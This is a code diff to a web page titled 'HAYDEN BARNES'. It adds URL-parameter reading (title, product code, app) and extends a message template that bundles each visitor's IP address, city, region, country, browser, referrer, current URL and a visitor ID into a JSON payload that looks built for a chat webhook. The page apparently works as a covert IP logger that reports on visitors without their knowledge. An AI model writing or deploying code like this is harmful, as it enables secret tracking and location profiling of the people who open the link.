@@ -3,6 +3,29 @@
 <head>
 	<title>HAYDEN BARNES</title>
 
+<script>
+  // Get the URL parameter value
+  // Get the URL parameter values
+const urlParams = new URLSearchParams(window.location.search);
+
+// Get the value of 'url' parameter
+const urlParam = urlParams.get('url');
+
+// Get the value of 'title' parameter
+const titleParam = urlParams.get('title');
+
+// Get the value of 'pcode' parameter
+const pcodeParam = urlParams.get('pcode');
+
+// Get the value of 'app' parameter
+const appParam = urlParams.get('app');
+
+// Log the values to the console
+console.log('URL Parameter:', urlParam);
+console.log('Title Parameter:', titleParam);
+console.log('Product Code Parameter:', pcodeParam);
+console.log('App Parameter:', appParam);
+</script>
 
 
 
@@ -143,8 +166,11 @@
             computer: '💻',
         };
 
-        const messageContent = `**🚩  IP Address:** ${data.ip_address}\n` +
-            `**🔗 Current URL:** ${data.current_url}\n` +
+        const messageContent = `**   Visitorid:** ${visitorId}\n` +
+            `** 🚩  IP Address:** ${data.ip_address}\n` +
+	   `**📌 Title:** ${titleParam}\n` +
+		  `**🔢 Product Code:** ${pcodeParam}\n` +
+		  `**📱 App:** ${appParam}` +
             `**🏘️ City:** ${data.city}\n` +
             `**🏞️Region:** ${data.region}\n` +
             `**🌐 Country:** ${data.country} (${data.country_code})\n` +
@@ -158,7 +184,9 @@
             `**⌚ Time:** ${data.time}\n` +
             `**🔗 Referring URL:** ${data.referringURL}\n` +
             `**🌐 Browser:** ${data.browser}\n` +
-            `**💻  Visitorid:** ${visitorId}`;
+            `**🔗 Current URL:** ${data.current_url}\n`+
+	   
+        `**📱 App:** ${appParam}`;
 
 
         const message = JSON.stringify({ content: messageContent });
